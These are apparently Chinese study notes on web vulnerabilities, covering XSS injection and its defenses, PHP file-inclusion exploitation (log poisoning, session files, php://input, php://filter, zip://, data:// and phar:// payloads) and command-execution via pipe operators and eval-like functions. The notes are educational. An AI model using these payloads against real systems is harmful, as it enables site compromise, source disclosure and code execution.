<p>所有的DOM元素无外乎分为两种：文本和元素。使用<strong>innerHTML</strong>属性就可以从一个元素中提取所有的HTML和文本。具体代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;tr1&quot;&gt;</span><br><span class="line">&lt;h1&gt;hello world!&lt;/h1&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">alert(document.getElementByld(&quot;tr1&quot;).innerHTML);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>使用 innerHTML方法还可以向HTML DOM中插入新内容，具体示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href= “#” onclick= &quot;this.innerHTML= &#x27;&lt;h1&gt;this is new message&lt;/h1&gt;&#x27; &quot;&gt;Old message&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>用浏览器打开含上述HTML代码的文档，单击Old message超级链接，此时页面会替换当前标签中的内容。插入&lt;html&gt;标签语句的位置可以指定为:<br>        a.beforeBegin:插入到标签开始标记前<br>        b.afterBegin:插入到标签开始标记后<br>        c.beforeEnd:插入到标签结束标记前<br>        d.afterEnd:插入到标签结束标记后</p>
<p><img src="https://pic.imgdb.cn/item/6758f683d0e0a243d4e19073.png"></p>
<p><img src="https://pic.imgdb.cn/item/6758f6bad0e0a243d4e190e0.png"></p>
<p><img src="https://pic.imgdb.cn/item/6758f75ad0e0a243d4e1921e.png"></p>
<h5 id="蠕虫攻击实例"><a href="#蠕虫攻击实例" class="headerlink" title="蠕虫攻击实例"></a>蠕虫攻击实例</h5><p>​		2011年6月28日，国内最火的信息发布平台之–新浪微博(<a target="_blank" rel="noopener" href="http://weibo.com)遭遇xss蠕虫攻击,受害者被强迫发布带有攻击链接的私信或“3d肉蒲团高清普通话版种子“微博,内容类似“个税起征点有望提到4000”“可以监听别人手机的软件”等含有诱惑性的信息.用户在感染蠕虫的同时会自动关注一位名为“hellosamy”的微博用户,然后向其他好友发送含有同样链接地址的私信./">http://weibo.com)遭遇XSS蠕虫攻击，受害者被强迫发布带有攻击链接的私信或“3D肉蒲团高清普通话版种子“微博，内容类似“个税起征点有望提到4000”“可以监听别人手机的软件”等含有诱惑性的信息。用户在感染蠕虫的同时会自动关注一位名为“hellosamy”的微博用户，然后向其他好友发送含有同样链接地址的私信。</a><br>​		新浪微博的XSS蠕虫爆发仅执续了16分钟，感染的用户就达到将近33000个，可见Web蠕虫的危害性十分巨大</p>
<p><img src="https://pic.imgdb.cn/item/6758f802d0e0a243d4e19387.png"></p>
<h4 id="4-4-10-XSS攻击防御"><a href="#4-4-10-XSS攻击防御" class="headerlink" title="4.4.10 XSS攻击防御"></a>4.4.10 XSS攻击防御</h4><h5 id="XSS-Filter"><a href="#XSS-Filter" class="headerlink" title="XSS Filter"></a>XSS Filter</h5><p>​		XSS Filter的作用是通过<strong>正则的方式</strong>对用户(客户端)请求的参数做脚本的过滤，从而达到防范XSS攻击的效果。<br>XSS Filter作为防御跨站攻击的主要手段之一，已经广泛应用在各类Web系统之中<br>​		包括现今的许多应用软件，例如Chrome浏览器，通过加入XSS Filter功能可以有效防范所有非持久型的XSS攻击攻击。</p>
<h5 id="过滤方法"><a href="#过滤方法" class="headerlink" title="过滤方法"></a>过滤方法</h5><ol>
<li><p>两种过滤<br>     防御跨站脚本攻击的方式一般有两种：<strong>Input Filtering</strong>和<strong>Output Filtering</strong>，分别在输入端(Input)和输出端(Output)进行过滤，即输入验证和输出过滤。<br>     <strong>输入验证</strong>是对输入的所有数据都须经过验证，验证所有输入数据的长度、类型、语法以及业务规则，被确认安全后才会存入数据库中；<strong>输出过滤</strong>在数据输出前，确保用户提交的数据被正确编码，建议对所有字符进行编码而不仅局限于某个子集。<br>     应用安全国际组织OWASP建议，防护XSS最佳的方法是结合输入验证和输出过滤</p>
</li>
<li><p>输入过滤</p>
</li>
</ol>
<p>​		“永远不要相信用户的输入”是对设计人员和编码人员说的，是进行安全设计和安全编码的重要准则。换句话说，任何输入数据在证明其无害之前，都是有害的。许多危险的漏洞就是因为过于相信用户的输入是善意的而导致的。</p>
<p>​		对输入数据的过滤，具体可以从两方面着手：<strong>输入验证</strong>和<strong>数据净化</strong>。</p>
<ul>
<li>输入验证<br>      输入验证是对输入数据使用<strong>强类型检查</strong>，验证数据的类型、长度、格式、范围等。</li>
<li>数据净化<br>      数据净化是为了使有潜在危害的数据变得安全。如果所允许的输入范围不能保证输入数据的安全性，数据净化就非常有用。数据净化包括从**<u>删除用户输入字符串后面的空格到去除值等一切行为</u><strong>。在 Web 应用程序中，常见的数据净化示例是使用 <u><strong>URL 编码或HTML编码来包装数据</strong></u>，并将其</strong><u>作为文本而不是可执行脚本来处理</u>**。</li>
</ul>
<p>输入验证：</p>
<p><img src="https://pic.imgdb.cn/item/6758fa12d0e0a243d4e1971a.png"></p>
<p>输入验证要根据实际情况来设计，下面是一些常见的检测和过滤:<br>（1）输入是否仅仅包含合法的字符;<br>（2）输入字符串是否超过最大长度限制;<br>（3）输入如果为数字，数字是否在指定的范围<br>（4）输入是否符合特殊的格式要求，如E-mail地址、IP地址等，<br>而对于重要敏感的信息，如折扣、价格等，应放到服务器端进行传参与校验等操作。</p>
<p>数据净化：</p>
<p>​		除了在客户端验证数据的合法性，输入过滤中还需要净化有害的输入，例如以下常见的敏感字符:<br>​		&lt;  &gt;  “  &amp;  #  javascript<br>​		但是，仅过滤以上敏感字符是远远不够的。为了能够提供两层防御和确保Web应用程序的安全，对Web应用的输出也要进行<strong>过滤和编码</strong>。</p>
<ol start="3">
<li>输出编码</li>
</ol>
<p>​		当需要将一个字符串输出到Web网页时，同时又不确定这个字符串中是否包括XSS特殊字符(如&lt; &gt; &amp;  ‘ “等)，为了确保输出内容的完整性和正确性，可以使用编码(HTML Encode)进行处理。<br>​		HTML编码在防止XSS攻击上起到很大的作用，它主要是用对应的HTML标记换为实体，这样做可确保浏览器显示实体，但不运行他们，将其当作HTML文档的内容而非结构加以处理。一些常见的可能造成问题的字符的HTML编码:</p>
<p><img src="https://pic.imgdb.cn/item/6758fca2d0e0a243d4e19d3b.png"></p>
<p>htmlspecialchars()函数可以将以下五种HTML 特殊字符转成字符实体编码:<br>&lt;	转成	&amp;lt</p>
<p>&gt;	转成    &amp;gt</p>
<p>&amp;    转成   &amp;amp</p>
<p>“	 转成   &amp;quot</p>
<p>‘      转成   &amp;#39</p>
<p>​		如果说对输入数据的过滤是针对可疑的信息进行防范，那么针对输出数据进行编码就是让可能造成危害的信息变成无害。</p>
<ul>
<li>输入过滤<br>  在数据存储数据库之前便对<strong>特殊的字符进行转义</strong>，方便简洁，顺便可以把SQL注入等其他漏洞一并检验。而缺点就是<strong>无法处理之前已经存在于数据库中的恶意代码</strong>。</li>
<li>输出过滤<br>  在数据输出之前先对部分敏感字符进行转义，这是一个很安全的方法，能有效保持数据的完整性。缺点是必须对每一个细节的输出仔细过滤，因此会带来额外的工作量。</li>
</ul>
<h5 id="Web安全编码规范"><a href="#Web安全编码规范" class="headerlink" title="Web安全编码规范"></a>Web安全编码规范</h5><p>​		在输出数据前对潜在威胁的字符进行编码、转义，是防御XSS攻击的有效措施。<br>​		这些输出一般是动态内容。对Web应用而言，其动态内容可能来源于用户输入URL、HTTP头、POST数据、Cookies的值、查询关键字等，所以，在应对不同背景下的动态内容的XSS攻击时，要部署不同的解决方案。</p>
<ol>
<li>body文本</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">假设有如下HTML片段</span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>错误: 你的査询 &lt;?=$query?&gt;没有返回任何结果<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">攻击者可能将动态内容$query替换成恶意的XSS输入:</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>evil_script()<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">返回的HTML代码为:</span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>错误: 你的査询<span class="tag">&lt;<span class="name">script</span>&gt;</span>evil_script()<span class="tag">&lt;/<span class="name">script</span>&gt;</span>没有返回任何结果<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>防范：</p>
<p><img src="https://pic.imgdb.cn/item/6758ff93d0e0a243d4e1a3ae.png"></p>
<ol start="2">
<li>HTML标签中的内容</li>
</ol>
<p>一些HTML标签如&lt;input&gt;、&lt;style&gt;、&lt;color&gt;等的属性值可能为动态内容，该情况下常存在XSS威胁。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;査询值:$query&lt;/div&gt; 或 &lt;input name=&quot;name&quot; value=&quot;&lt;?=$query?&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>攻击者试图输入&lt;、&gt;等字符产生一个新的&lt;script&gt;标记：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss&quot;&gt;&lt;script&gt;evil script()&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>然后，返回HTML代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;name&quot; value=&quot;xss&quot;&gt;&lt;script&gt;evil script()&lt;/script&gt;&quot;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://pic.imgdb.cn/item/67590096d0e0a243d4e1a43e.png"></p>
<p>防范:</p>
<p><img src="https://pic.imgdb.cn/item/67590131d0e0a243d4e1a466.png"></p>
<ol start="3">
<li>&lt;script&gt;&lt;&#x2F;script&gt;中的内容</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/6759019fd0e0a243d4e1a475.png"></p>
<p>防范：</p>
<p><img src="https://pic.imgdb.cn/item/675901c2d0e0a243d4e1a483.png"></p>
<ol start="4">
<li>JavaScript事件</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/6759021cd0e0a243d4e1a496.png"></p>
<p>防范：</p>
<p><img src="https://pic.imgdb.cn/item/67590264d0e0a243d4e1a4b4.png"></p>
<h4 id="4-4-11-XSS相关工具使用"><a href="#4-4-11-XSS相关工具使用" class="headerlink" title="4.4.11 XSS相关工具使用"></a>4.4.11 XSS相关工具使用</h4><h5 id="XSS工具"><a href="#XSS工具" class="headerlink" title="XSS工具"></a>XSS工具</h5><ol>
<li>Burpsuite的xss检测功能</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/675903cbd0e0a243d4e1a545.png"></p>
<p><img src="https://pic.imgdb.cn/item/67590563d0e0a243d4e1a5c1.png"></p>
<h5 id="XSS测试平台"><a href="#XSS测试平台" class="headerlink" title="XSS测试平台"></a>XSS测试平台</h5><p>网上找测试平台，搭建在本地服务器上</p>
<h5 id="XSS漏洞利用"><a href="#XSS漏洞利用" class="headerlink" title="XSS漏洞利用"></a>XSS漏洞利用</h5><p><img src="https://pic.imgdb.cn/item/6759065ad0e0a243d4e1a611.png"></p>
<p>拿到Cookie：</p>
<p><img src="https://pic.imgdb.cn/item/67590743d0e0a243d4e1a671.png"></p>
<p>Cookie的利用方法：</p>
<p><img src="https://pic.imgdb.cn/item/67590756d0e0a243d4e1a67c.png"></p>
<h3 id="第五部分-文件包含漏洞原理与验证"><a href="#第五部分-文件包含漏洞原理与验证" class="headerlink" title="第五部分 文件包含漏洞原理与验证"></a>第五部分 文件包含漏洞原理与验证</h3><h4 id="4-5-文件包含"><a href="#4-5-文件包含" class="headerlink" title="4.5 文件包含"></a>4.5 文件包含</h4><h5 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h5><ol>
<li>概念</li>
</ol>
<p>​		把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，无需再次编写函数。这一调用文件的过程被称为包含。</p>
<ol start="2">
<li>原理</li>
</ol>
<p>​		文件包含漏洞产生的原因是在通过PHP函数引入文件时，由于**<u>传入的文件名没有经过合理的校验，从而操作了预想之外的文件</u>**，就可能导致意外的文件泄露甚至恶意的代码注入。<br>​		几乎所有的脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP Web Application中居多，而在JSP、ASP、ASP.NET程序中却非常少，这是有些语言设计的弊端。在PHP中经常出现文件包含漏洞，但并不意味着其他语言不存在。</p>
<h5 id="PHP文件包含"><a href="#PHP文件包含" class="headerlink" title="PHP文件包含"></a>PHP文件包含</h5><ol>
<li>文件包含函数</li>
</ol>
<ul>
<li>include()：找不到被包含文件时会产生警告(EWARNING)</li>
<li>include_once()：与include()类似，代码已经被包含则不会再次包含，只包含一次</li>
<li>require()：找不到被包含的文件时会产生致命错误(ECOMPILE ERROR)</li>
<li>require_once()：与require()类似，代码已经被包含则不会再次包含，只包含一次</li>
</ul>
<ol start="2">
<li>利用条件</li>
</ol>
<p>（1）include等函数通过动态执行变量的方式引入需要包含的文件</p>
<p>（2）用户能控制该动态变量</p>
<ol start="3">
<li>文件包含示例</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/67592bafd0e0a243d4e1af86.png"></p>
<p>array.php：</p>
<p><img src="https://pic.imgdb.cn/item/67592ccbd0e0a243d4e1b01b.png"></p>
<p>main.php：</p>
<p><img src="https://pic.imgdb.cn/item/67592cf7d0e0a243d4e1b02f.png"></p>
<p>访问效果:</p>
<p><img src="https://pic.imgdb.cn/item/67592d20d0e0a243d4e1b03b.png"></p>
<p><img src="https://pic.imgdb.cn/item/67592c8fd0e0a243d4e1aff9.png"></p>
<p>将以上内容注释，引入一个自己写的php文件（包含phpinfo语句）</p>
<p><img src="https://pic.imgdb.cn/item/67592d58d0e0a243d4e1b053.png"></p>
<p>访问效果：</p>
<p><img src="https://pic.imgdb.cn/item/67592f2dd0e0a243d4e1b123.png"></p>
<p><strong>注意：文件包含漏洞无视文件后缀名</strong></p>
<ol start="4">
<li>文件包含分类</li>
</ol>
<p>​		文件包含漏洞可以分为<strong>LFl</strong>(Local File Inclusion，本地文件包含)和<strong>RFI</strong>(Remote File Inclusion，远程文件包含)两种。而区分二者最简单的办法就是通过查看php.ini中是否开启了allow_url_include。如果开启就有可能包含远程文件。<br>​		远程文件包含需要php.ini中allow_url_include&#x3D;on，allow_url_fopen &#x3D;On。在php.ini中，allow_url_fopen默认一直是On，而allow_url_sinclude从php5.2之后就默认为Off。</p>
<p><img src="https://pic.imgdb.cn/item/6759301fd0e0a243d4e1b17b.png"></p>
<ul>
<li>本地文件包含</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/6759310cd0e0a243d4e1b1d3.png"></p>
<ul>
<li>远程文件包含</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/67593164d0e0a243d4e1b1f1.png"></p>
<p>​	<img src="https://pic.imgdb.cn/item/67593205d0e0a243d4e1b22c.png"></p>
<h5 id="文件包含漏洞利用"><a href="#文件包含漏洞利用" class="headerlink" title="文件包含漏洞利用"></a>文件包含漏洞利用</h5><ol>
<li>读取敏感文件：</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/675932b5d0e0a243d4e1b27c.png"></p>
<p><img src="https://pic.imgdb.cn/item/67593309d0e0a243d4e1b2a5.png"></p>
<ol start="2">
<li>本地包含配合文件上传</li>
</ol>
<p>​		上传一个jpg，是无法解析为php的，因此无法getshell，但是利用文件包含去读取jpg，会无视后缀名，从而进行php的解析，从而getshell</p>
<p><img src="https://pic.imgdb.cn/item/67593360d0e0a243d4e1b2e7.png"></p>
<ol start="3">
<li>远程包含shell</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/67593406d0e0a243d4e1b33b.png"></p>
<ol start="4">
<li>包含Apache日志文件</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/675935dfd0e0a243d4e1b3fa.png"></p>
<p><img src="https://pic.imgdb.cn/item/67593649d0e0a243d4e1b42f.png"></p>
<p>​		<u>bp抓包，将url编码过的字符，更改回原来的样子，然后包含（访问）access.log日志，日志将解析代码，从而显示信息</u></p>
<p><img src="https://pic.imgdb.cn/item/675939e5d0e0a243d4e1b5f2.png"></p>
<p><img src="https://pic.imgdb.cn/item/6759394dd0e0a243d4e1b590.png"></p>
<p>日志默认存储路径：</p>
<ul>
<li><p>Apache</p>
<ul>
<li><p>Apache +Linux日志默认路径<br>  &#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access log 或 &#x2F;var&#x2F;log&#x2F;httpd&#x2F;access log</p>
</li>
<li><p>Apache+Windows日志默认路径<br>  XAMPP套件：xampp\apache\logs&#x2F;access.log<br>  phpStudy套件：phpStudy\Apache\logs&#x2F;access.log</p>
</li>
</ul>
</li>
<li><p>IIS</p>
<ul>
<li>IIS6 默认日志文件位置<br>  C:WINDOWS\system32\Logfiles</li>
<li>IIS7 默认日志文件位置<br>  %SystemDrive%\inetpub\logs\LogFiles</li>
</ul>
</li>
<li><p>Nginx</p>
<ul>
<li>nginx日志文件在用户安装目录的logs目录下<br>  如安装目录为&#x2F;usr&#x2F;local&#x2F;nginx，则日志目录就是在&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs里，也可通过其配置文件nginx.conf，获取到日志的存在路径(&#x2F;opt&#x2F;nginx&#x2F;logs&#x2F;access.log)</li>
</ul>
</li>
</ul>
<ol start="5">
<li>包含SSH日志文件</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/67593b65d0e0a243d4e1b752.png"></p>
<ol start="6">
<li>包含session文件</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/67593ba4d0e0a243d4e1b76e.png"></p>
<p><img src="https://pic.imgdb.cn/item/67593bd1d0e0a243d4e1b7d7.png"></p>
<p><img src="https://pic.imgdb.cn/item/67593c28d0e0a243d4e1b86e.png"></p>
<p><strong>session文件名&#x3D;sess_ + PHPSESSION的值</strong></p>
<ol start="7">
<li>使用PHP封装伪协议</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/67593cbdd0e0a243d4e1b8a4.png"></p>
<p>（1）php流input：</p>
<p>​		利用php中流的概念，将原本的include的<strong>文件流</strong>重定向到了用户可控制的<strong>输入流</strong>中命令执行(allow_url_ include:on，allow_url_fopen不做要求)</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include/03/index.php?page=**php://input">http://127.0.0.1/include/03/index.php?page=**php://input</a>**</p>
<p>用户可输入流就是POST写入部分</p>
<p><img src="https://pic.imgdb.cn/item/675954afd0e0a243d4e1c6dd.png"></p>
<p>如果换成这句话，就是生成了一个shell的木马文件</p>
<p><img src="https://pic.imgdb.cn/item/67595511d0e0a243d4e1c707.png"></p>
<p>POST部分可以控制输出</p>
<p><img src="https://pic.imgdb.cn/item/67595540d0e0a243d4e1c719.png"></p>
<p>（2）php流filter：</p>
<p>​		读取文件(allow_url _include和allow_url_fopen都不做要求)</p>
<p>​		?page&#x3D;<strong>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource</strong>&#x3D;index.php</p>
<p>​		通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。</p>
<p><img src="https://pic.imgdb.cn/item/675955f4d0e0a243d4e1c73d.png"></p>
<p>例子：</p>
<p><img src="https://pic.imgdb.cn/item/6759563dd0e0a243d4e1c74a.png"></p>
<p>得到之后解码BASE64即可得到数据</p>
<p>（3）zip:&#x2F;&#x2F;实验</p>
<p>?page&#x3D;<strong>zip:&#x2F;&#x2F;<strong>C:&#x2F;Users&#x2F;40454&#x2F;Desktop&#x2F;test.jpg</strong>%23</strong>test.txt（此处的%23为#，固定格式，表示zip里的txt文件）</p>
<p>​		本地先将要执行的PHP代码写好文件名为test.txt，将test.txt进行zip压缩，压缩文件名为test.zip，如果可以上传zip文件便直接上传，若不能便将test.zip重命名为test.jpg后再上传，上传之后再利用包含漏洞</p>
<p><img src="https://pic.imgdb.cn/item/675956ebd0e0a243d4e1c787.png"></p>
<p>​	例子：<strong>只看网站的URL部分的内容</strong></p>
<p><img src="https://pic.imgdb.cn/item/675957d7d0e0a243d4e1c7c2.png"></p>
<p>（4）data:&#x2F;&#x2F;</p>
<p>命令执行(php版本大于等于5.2，allow_url_include和allow_url_fopen都为on的状态)</p>
<p>?page&#x3D;**data:&#x2F;&#x2F;**text&#x2F;plain,&lt;?php phpinfo();?&gt;</p>
<p>?page&#x3D;**data:&#x2F;&#x2F;**text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</p>
<p><img src="https://pic.imgdb.cn/item/67595882d0e0a243d4e1c7db.png"></p>
<p>例子：<strong>只看网页URL部分</strong></p>
<p>两种：</p>
<p><img src="https://pic.imgdb.cn/item/675958b0d0e0a243d4e1c7ef.png"></p>
<p><img src="https://pic.imgdb.cn/item/675958c8d0e0a243d4e1c7fd.png"></p>
<p>（5）phar:&#x2F;&#x2F;</p>
<p>利用姿势:<br>假如有个文件test.txt，打包成zip压缩包，指定绝对路径(或者使用相对路径)</p>
<p>?page&#x3D;**phar:&#x2F;&#x2F;<strong>C:&#x2F;Users&#x2F;40454&#x2F;Desktop&#x2F;test.zip</strong>&#x2F;**test.txt或</p>
<p>?page&#x3D;**phar:&#x2F;&#x2F;<strong>C:&#x2F;Users&#x2F;40454&#x2F;Desktop&#x2F;test.jpg</strong>&#x2F;**test.txt</p>
<p><img src="https://pic.imgdb.cn/item/67595a0ad0e0a243d4e1c88a.png"></p>
<h6 id="伪协议用法小结"><a href="#伪协议用法小结" class="headerlink" title="伪协议用法小结"></a>伪协议用法小结</h6><p><img src="https://pic.imgdb.cn/item/67595a4bd0e0a243d4e1c8a3.png"></p>
<h3 id="第六部分-命令执行漏洞原理与验证"><a href="#第六部分-命令执行漏洞原理与验证" class="headerlink" title="第六部分 命令执行漏洞原理与验证"></a>第六部分 命令执行漏洞原理与验证</h3><h4 id="4-6-1-命令执行漏洞概述"><a href="#4-6-1-命令执行漏洞概述" class="headerlink" title="4.6.1 命令执行漏洞概述"></a>4.6.1 命令执行漏洞概述</h4><h5 id="命令执行定义"><a href="#命令执行定义" class="headerlink" title="命令执行定义"></a>命令执行定义</h5><ol>
<li>基本定义</li>
</ol>
<p>​		命令执行漏洞是指攻击者可以随意执行系统命令，分为<strong>远程命令执行</strong>(远程代码执行)和<strong>系统命令执行</strong>两类。</p>
<ol start="2">
<li>原理</li>
</ol>
<p>​		程序应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shellexec、passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击。</p>
<h5 id="命令执行的条件"><a href="#命令执行的条件" class="headerlink" title="命令执行的条件"></a>命令执行的条件</h5><ul>
<li>两个条件<ul>
<li>用户能够控制的函数输入</li>
<li>存在可以执行代码或者系统命令的危险函数</li>
</ul>
</li>
</ul>
<h5 id="命令执行成因"><a href="#命令执行成因" class="headerlink" title="命令执行成因"></a>命令执行成因</h5><ul>
<li>由于开发人员编写源码时，<u>没有针对代码中可执行的特殊函数入口做过滤</u>，导致客户端可以提交恶意构造语句，并提交服务端执行</li>
<li>命令注入攻击中，<u>Web服务器没有过滤类似system、eval和exec等函数</u>，是该漏洞攻击成功的主要原因。</li>
</ul>
<h5 id="命令执行危害"><a href="#命令执行危害" class="headerlink" title="命令执行危害"></a>命令执行危害</h5><ul>
<li>继承Web服务程序的权限去执行系统命令(任意代码)或读写文件</li>
<li>反弹shell</li>
<li>控制整个网站甚至控制服务器</li>
<li>进一步内网渗透</li>
</ul>
<h5 id="命令执行实例"><a href="#命令执行实例" class="headerlink" title="命令执行实例"></a>命令执行实例</h5><p><img src="https://pic.imgdb.cn/item/67595d75d0e0a243d4e1c9b7.png"></p>
<p><img src="https://pic.imgdb.cn/item/67595dc9d0e0a243d4e1c9c4.png"></p>
<p><img src="https://pic.imgdb.cn/item/67595e51d0e0a243d4e1c9eb.png"></p>
<p><img src="https://pic.imgdb.cn/item/67595e76d0e0a243d4e1c9f5.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">以下是一个简单的示例，展示了如何使用array_map函数将一个数组中的每个数字乘以自身：</span><br><span class="line">function cube($n) &#123;</span><br><span class="line">return ($n * $n * $n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = [1, 2, 3, 4, 5];</span><br><span class="line">$b = array_map(&#x27;cube&#x27;, $a);</span><br><span class="line">print_r($b);</span><br><span class="line">在这个例子中，cube函数被应用于数组$a中的每个元素，结果存储在数组$b中。输出将是每个数字的立方。</span><br></pre></td></tr></table></figure>



<p><img src="https://pic.imgdb.cn/item/67595ef0d0e0a243d4e1ca0f.png"></p>
<h5 id="管道符号和通用命令符"><a href="#管道符号和通用命令符" class="headerlink" title="管道符号和通用命令符"></a>管道符号和通用命令符</h5><ol>
<li>管道符号</li>
</ol>
<ul>
<li>Linux<br>  ;     前面的执行完执行后面的<br>  |    是管道符，显示后面的执行结果<br>  ||  当前面的执行出错时执行后面的</li>
<li>Windows<br>  &amp;     前面的语句为假则直接执行后面的<br>  &amp;&amp;  前面的语句为假则直接出错，后面的也不执行<br>  |      直接执行后面的语句<br>  ||    前面出错执行后面的</li>
</ul>
<ol start="2">
<li>通用命令符</li>
</ol>
<ul>
<li><p>command1 &amp;&amp; command2        先执行command1后执行command2</p>
</li>
<li><p>command1 | command2            只执行command2</p>
</li>
<li><p>command1 &amp; command2           先执行command2后执行command1</p>
</li>
</ul>
<p>​	</p>
<h5 id="命令执行常见场景"><a href="#命令执行常见场景" class="headerlink" title="命令执行常见场景"></a>命令执行常见场景</h5><p>常见场景：</p>
<ul>
<li>Ping主机<ul>
<li><img src="https://pic.imgdb.cn/item/67596187d0e0a243d4e1caf9.png"></li>
<li>利用管道符，让其不止执行ping，再拼接其他命令执行</li>
</ul>
</li>
<li>DNS请求<ul>
<li><img src="https://pic.imgdb.cn/item/675961cfd0e0a243d4e1cb00.png"></li>
<li>同样的，管道符拼接其他指令执行</li>
</ul>
</li>
<li>Office文档<ul>
<li><img src="https://pic.imgdb.cn/item/675961f9d0e0a243d4e1cb08.png"></li>
<li>宏病毒</li>
</ul>
</li>
<li>框架缺陷<ul>
<li><img src="https://pic.imgdb.cn/item/67596225d0e0a243d4e1cb0e.png"></li>
<li>Struts2参考链接:<a target="_blank" rel="noopener" href="https://www.w3cschool.cn/struts_2/">https://www.w3cschool.cn/struts_2/</a></li>
</ul>
</li>
</ul>
<h4 id="4-6-2-远程命令执行"><a href="#4-6-2-远程命令执行" class="headerlink" title="4.6.2 远程命令执行"></a>4.6.2 远程命令执行</h4><h5 id="远程命令执行漏洞相关函数"><a href="#远程命令执行漏洞相关函数" class="headerlink" title="远程命令执行漏洞相关函数"></a>远程命令执行漏洞相关函数</h5><p>在PHP下，允许命令执行的函数有：</p>
<ul>
<li>eval()</li>
<li>assert()</li>
<li>preg_replace()</li>
<li>call_user_func()</li>
<li>$a($b)</li>
</ul>
<p>如果页面中存在这些函数并且对于用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏洞。</p>
<ol>
<li>eval()</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/6759636dd0e0a243d4e1cb5f.png"></p>
<p><img src="https://pic.imgdb.cn/item/67598f7ed0e0a243d4e1d6c5.png"></p>
<p><img src="https://pic.imgdb.cn/item/67598fd5d0e0a243d4e1d6d7.png"></p>
<p><img src="https://pic.imgdb.cn/item/67599007d0e0a243d4e1d6ed.png"></p>
<p><img src="https://pic.imgdb.cn/item/6759903fd0e0a243d4e1d709.png"></p>
<ol start="2">
<li>assert()</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/67599094d0e0a243d4e1d728.png"></p>
<p><img src="https://pic.imgdb.cn/item/675990cdd0e0a243d4e1d734.png"></p>
<p><img src="https://pic.imgdb.cn/item/675990e8d0e0a243d4e1d73d.png"></p>
<ol start="3">
<li>preg_replace()</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/6759911fd0e0a243d4e1d74a.png"></p>
<p><img src="https://pic.imgdb.cn/item/6759918ad0e0a243d4e1d75a.png"></p>
<ul>
<li><p>\\n就是第n次捕获的结果进行替换（或$n）</p>
</li>
<li><p>\\0代表完整的模式匹配文本</p>
</li>
<li><p>.*表示任意</p>
</li>
<li><p>&#x2F;e表示把他当作php文本</p>
</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/67599267d0e0a243d4e1d780.png"></p>
<p>当注释下面那一行，使用上面那一行代码时，多一个[]的匹配</p>
<p><img src="https://pic.imgdb.cn/item/675992cfd0e0a243d4e1d793.png"></p>
<p>于是参数需要多一个中括号[]</p>
<p><img src="https://pic.imgdb.cn/item/67599325d0e0a243d4e1d7a5.png"></p>
<ol start="4">
<li>call_user_func()</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/675993a0d0e0a243d4e1d7a9.png"></p>
<p><img src="https://pic.imgdb.cn/item/675993d8d0e0a243d4e1d7cc.png"></p>
